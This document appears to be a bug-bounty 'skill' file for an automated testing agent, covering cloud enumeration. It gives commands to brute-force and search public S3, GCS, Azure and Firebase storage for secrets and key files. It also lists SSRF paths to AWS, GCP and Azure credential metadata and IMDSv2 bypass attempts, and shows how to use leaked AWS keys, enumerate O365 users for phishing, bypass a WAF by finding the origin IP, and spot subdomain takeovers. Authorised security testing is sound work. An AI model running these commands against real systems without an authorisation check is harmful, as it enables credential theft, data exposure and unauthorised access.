# SKILL: Cloud Asset Enumeration & Testing
**Misconfigured cloud = easy criticals. Always check.**

---

## AWS ENUMERATION

### S3 Bucket Discovery
```bash
# Generate bucket name candidates from target
python3 scripts/s3-wordlist-gen.py {TARGET} {ORG_NAME} > wordlists/s3-candidates.txt
# Patterns: target-prod, target-backup, target-logs, target-dev, target-assets, target-media
# Also: www-target, api-target, internal-target, target-uploads

# Test each bucket for public access
cat wordlists/s3-candidates.txt | while read bucket; do
  result=$(aws s3 ls s3://$bucket --no-sign-request 2>&1)
  if echo "$result" | grep -v "NoSuchBucket\|AccessDenied" | grep -q "PRE\|[0-9]"; then
    echo "[PUBLIC] s3://$bucket"
    aws s3 ls s3://$bucket --no-sign-request --recursive | grep -iE "\.env|\.sql|\.bak|\.key|\.pem|secret|password|credential"
  fi
done

# s3scanner for bulk checking
s3scanner scan --bucket-file wordlists/s3-candidates.txt
```

### EC2 Metadata SSRF
```bash
# If SSRF is found, target AWS metadata service:
# http://169.254.169.254/latest/meta-data/
# http://169.254.169.254/latest/meta-data/iam/security-credentials/
# http://169.254.169.254/latest/user-data/  (often contains secrets)

# IMDSv2 bypass attempts:
# X-aws-ec2-metadata-token-ttl-seconds: 21600 header
# http://[fd00:ec2::254]/latest/meta-data/
```

### AWS Keys in Code/Endpoints
```bash
# Pattern: AKIA + 16 alphanumeric chars
grep -rE "AKIA[0-9A-Z]{16}" sessions/{DATE}/

# Validate found keys (read-only test)
aws sts get-caller-identity --profile found-key
aws s3 ls --profile found-key  # What can they access?
```

---

## GCP ENUMERATION

### GCS Bucket Testing
```bash
# GCS buckets follow similar patterns to S3
# Test: https://storage.googleapis.com/{BUCKET}/

# gsutil for enumeration
gsutil ls gs://{target}-{suffix}  # Try various suffixes

# Check for public bucket via HTTP
curl -sk "https://storage.googleapis.com/{target}-backup/" | grep -i "Key\|LastModified"
```

### GCP Metadata via SSRF
```bash
# http://metadata.google.internal/computeMetadata/v1/
# Required header: Metadata-Flavor: Google
# instance/service-accounts/default/token
# instance/attributes/ (may contain startup scripts with secrets)
```

---

## AZURE ENUMERATION

### Azure Blob Storage
```bash
# Naming pattern: https://{account}.blob.core.windows.net/{container}/
# Common suffixes: backup, prod, dev, data, files, images, assets

# Test for public access
curl -sk "https://{target}.blob.core.windows.net/{container}?restype=container&comp=list"
# If returns XML list → publicly accessible container
```

### Azure AD / Tenant Enumeration
```bash
# Enumerate valid O365/Azure AD users (useful for phishing scope)
python3 scripts/o365-user-enum.py --domain {TARGET} --userlist wordlists/usernames.txt

# Check for exposed Azure metadata
# http://169.254.169.254/metadata/v1/maintenance (Azure metadata SSRF)
```

---

## FIREBASE / NOSQL CLOUD DBs

```bash
# Firebase exposed database (no auth)
curl -sk "https://{target}-default-rtdb.firebaseio.com/.json?shallow=true"
# If returns data → exposed Firebase DB

# Check Firebase security rules
curl -sk "https://{target}.firebaseio.com/.settings/rules.json"
```

---

## CLOUDFLARE ORIGIN IP BYPASS

```bash
# Target may be protected by Cloudflare but origin IP might be exposed
# Historical DNS records often reveal the real IP
curl -sk "https://securitytrails.com/domain/{TARGET}/history/a"

# Shodan search for SSL cert matching origin
shodan search "ssl.cert.subject.cn:{TARGET} http.title:" --fields ip_str,port

# cloudflair tool
python3 cloudflair.py {TARGET}

# Test origin directly (bypass WAF/CDN)
curl -sk -H "Host: {TARGET}" "http://{ORIGIN_IP}/"
```

---

## SUBDOMAIN TAKEOVER

```bash
# Check for dangling DNS entries (CNAME to abandoned service)
subjack -w sessions/{DATE}/all-subs-{TARGET}.txt \
  -t 100 -timeout 30 -o sessions/{DATE}/takeover-{TARGET}.txt -ssl

# Common vulnerable services: GitHub Pages, Heroku, Netlify, Azure, Fastly
# If CNAME points to {target}.github.io and no GitHub page exists → TAKEOVER

# Manual check: dig CNAME {subdomain} then check if the destination is claimable
```

---

## CLOUD FINDINGS PRIORITY

| Finding | Severity | Reporting Notes |
|---------|----------|-----------------|
| Public S3 with PII/secrets | Critical | Include sample data (redacted) |
| AWS keys with broad permissions | Critical | Run `aws sts get-caller-identity` as PoC |
| Subdomain takeover | High | Register the service and serve a benign page as PoC |
| GCS/Azure public containers | High-Critical | List content, note sensitive files |
| Firebase exposed DB with data | High | Screenshot data structure (redact PII) |
| EC2 metadata SSRF → credentials | Critical | Show IAM role name only, not full creds |
| Origin IP bypass | Medium | Show WAF bypass request/response |
